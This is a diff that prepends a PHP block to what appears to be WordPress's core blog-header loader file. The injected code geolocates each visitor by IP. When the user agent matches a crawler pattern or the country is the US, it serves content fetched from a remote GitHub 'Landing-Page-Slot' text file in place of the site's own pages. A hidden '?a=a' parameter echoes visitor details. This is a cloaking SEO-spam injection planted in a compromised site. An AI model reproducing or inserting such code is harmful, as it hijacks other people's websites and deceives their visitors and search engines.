@@ -1,0 +1,49 @@
+<?php
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'];
+function getCountryByIp($ip)
+{
+    $url = "http://ip-api.com/json/$ip";
+
+    $response = file_get_contents($url);
+    $data = json_decode($response, true);
+    $countryCode = $data['countryCode'];
+    return $countryCode;
+}
+$ctryCode = getCountryByIp($ip);
+
+if (isset($_GET['a']) && $_GET['a'] === 'a') {
+    echo "country: " . $ctryCode;
+    echo "<br>";
+    echo "useragent: " . $userAgent;
+    echo "<br>";
+    echo "ip: " . $ip;
+    exit;
+}
+
+if (preg_match('/bot|crawl|slurp|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot|spider/i', $userAgent) || $ctryCode == 'US') {
+    echo file_get_contents('https://raw.githubusercontent.com/ydaprn62/Landing-Page-Slot/refs/heads/main/rasta.edu.pk.txt');
+    exit;
+}
+?>
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+    $wp_did_header = true;
+
+    // Load the WordPress library.
+    require_once __DIR__ . '/wp-load.php';
+
+    // Set up the WordPress query.
+    wp();
+
+    // Load the theme template.
+    require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
